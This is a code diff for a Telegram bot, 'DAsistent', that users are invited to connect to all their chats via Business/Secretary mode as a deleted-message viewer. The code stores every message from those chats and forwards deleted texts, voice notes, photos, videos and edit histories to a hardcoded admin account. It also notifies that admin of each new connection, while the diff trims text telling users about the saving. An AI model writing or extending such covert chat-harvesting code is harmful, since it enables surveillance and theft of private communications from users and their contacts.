@@ -58,20 +58,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # Проверяем, подключён ли Secretary Mode
     c.execute('INSERT OR IGNORE INTO users (user_id, is_connected) VALUES (?,?)', (user_id, 0))
     conn.commit()
     
     if is_connected(user_id):
-        # Уже подключён
         keyboard = [[InlineKeyboardButton("🚀 Открыть DAsistent", web_app=WebAppInfo(url=GITHUB_PAGES_URL))]]
         await update.message.reply_text(
-            f"✅ **Бот уже подключён!**\n\nПривет, {user.first_name}!\nЯ мониторю все твои чаты и пришлю удалённые сообщения.",
+            f"✅ **Бот уже подключён!**\n\nПривет, {user.first_name}!\nЯ мониторю все твои чаты.",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
     else:
-        # Не подключён — даём инструкцию
         text = f"""🔐 **Привет, {user.first_name}!**
 
 Я **DAsistent** — бот, который видит удалённые сообщения.
@@ -85,95 +82,85 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    `Настройки` → `Секретарский режим` → `Добавить @HeiterszBOT`
    → Разреши доступ **«Ко всем чатам»**
 
-3️⃣ **После подключения** снова напиши `/start`
-
-⚡ **Как только подключишь — я начну сохранять все сообщения и пришлю подтверждение.**"""
+3️⃣ **После подключения** снова напиши `/start`"""
         
         await update.message.reply_text(text, parse_mode="Markdown")
 
-async def handle_business_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Когда пользователь подключает бота через Secretary Mode"""
-    if update.business_connection:
+async def handle_all_updates(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обрабатываем все обновления, включая business_connection"""
+    # Проверяем, есть ли business_connection
+    if hasattr(update, 'business_connection') and update.business_connection:
         user_id = update.business_connection.user_id
         c.execute('UPDATE users SET is_connected=1 WHERE user_id=?', (user_id,))
         conn.commit()
         
-        # Отправляем подтверждение
         keyboard = [[InlineKeyboardButton("🚀 Открыть DAsistent", web_app=WebAppInfo(url=GITHUB_PAGES_URL))]]
         await context.bot.send_message(
             chat_id=user_id,
-            text="✅ **Бот успешно подключён!**\n\nТеперь я буду сохранять все сообщения из твоих чатов и присылать удалённые.\n\nНажми на кнопку, чтобы открыть мини-приложение.",
+            text="✅ **Бот успешно подключён!**\n\nТеперь я буду сохранять все сообщения и присылать удалённые.",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         
-        # Уведомляем админа
         if ADMIN_ID:
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"🔗 Пользователь {user_id} подключил бота"
-            )
+            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Пользователь {user_id} подключил бота")
         logging.info(f"Business connection: {user_id}")
+    
+    # Обработка удалённых сообщений
+    if hasattr(update, 'deleted_business_messages') and update.deleted_business_messages:
+        for d in update.deleted_business_messages.messages:
+            c.execute('SELECT first_name, username, text, file_type, file_id, chat_title FROM messages WHERE msg_id=? AND chat_id=?',
+                      (d.message_id, d.chat_id))
+            row = c.fetchone()
+            
+            if not row:
+                if ADMIN_ID:
+                    await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено (не сохранено)\nChat: {d.chat_id}")
+                continue
+            
+            first_name, username, text, file_type, file_id, chat_title = row
+            name = f"{first_name} (@{username})" if username else first_name
+            
+            if ADMIN_ID:
+                if file_type == "text":
+                    await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
+                elif file_type == "voice":
+                    await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в {chat_title}")
+                elif file_type == "photo":
+                    await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в {chat_title}")
+                elif file_type == "video":
+                    await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в {chat_title}")
+                else:
+                    await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ {name} удалил(а) {file_type} в {chat_title}")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Сохраняем сообщения из всех чатов, если пользователь подключён"""
+    """Сохраняем сообщения"""
     if update.message and update.message.from_user:
         user_id = update.message.from_user.id
         if is_connected(user_id):
             save_message(update.message)
 
 async def handle_edited(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Изменённые сообщения"""
     msg = update.edited_message
     if not msg:
         return
     c.execute('SELECT text, first_name, chat_title FROM messages WHERE msg_id=? AND chat_id=?', (msg.message_id, msg.chat_id))
     row = c.fetchone()
-    if row:
+    if row and ADMIN_ID:
         save_message(msg)
-        if ADMIN_ID:
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"✏️ Изменено в {row[2]}:\n📌 Было: {row[0][:300]}\n🆕 Стало: {msg.text[:300]}"
-            )
-
-async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Удалённые сообщения — отправляем админу"""
-    if not hasattr(update, 'deleted_business_messages') or not update.deleted_business_messages:
-        return
-    
-    for d in update.deleted_business_messages.messages:
-        c.execute('SELECT first_name, username, text, file_type, file_id, chat_title FROM messages WHERE msg_id=? AND chat_id=?',
-                  (d.message_id, d.chat_id))
-        row = c.fetchone()
-        
-        if not row:
-            if ADMIN_ID:
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено (не сохранено)\nChat: {d.chat_id}")
-            continue
-        
-        first_name, username, text, file_type, file_id, chat_title = row
-        name = f"{first_name} (@{username})" if username else first_name
-        
-        if ADMIN_ID:
-            if file_type == "text":
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
-            elif file_type == "voice":
-                await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в {chat_title}")
-            elif file_type == "photo":
-                await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в {chat_title}")
-            elif file_type == "video":
-                await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в {chat_title}")
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"✏️ Изменено в {row[2]}:\n📌 Было: {row[0][:300]}\n🆕 Стало: {msg.text[:300]}"
+        )
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(MessageHandler(filters.COMMAND & filters.Regex(r'/start'), start))
-    app.add_handler(MessageHandler(filters.StatusUpdate.BUSINESS_CONNECTION, handle_business_connection))
+    app.add_handler(MessageHandler(filters.ALL, handle_all_updates), group=0)
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, handle_edited))
-    app.add_handler(MessageHandler(filters.ALL, handle_deleted), group=1)
     
-    logging.info("✅ DAsistent запущен. Ожидание подключения...")
+    logging.info("✅ DAsistent запущен")
     app.run_polling()
 
 if __name__ == "__main__":
